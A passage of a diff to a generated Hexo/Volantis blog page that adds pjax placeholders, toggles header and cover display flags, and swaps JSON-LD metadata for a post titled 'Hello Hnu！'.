+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2795,13 +2724,14 @@ Qu...
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2810,14 +2740,14 @@ Qu...
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3338,7 +3268,7 @@ Qu...
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2024/","name":"2024"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2024/8/","name":"8"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/知识分享/","name":"知识分享"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/09/04/栈迁移/","name":"Hello Hnu！"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Hello Hnu！","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/","wordCount":0,"datePublished":"2024-09-04T07:46:25.049Z","dateModified":"2024-09-04T08:45:17.571Z","articleSection":"知识分享","keywords":"知识分享","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
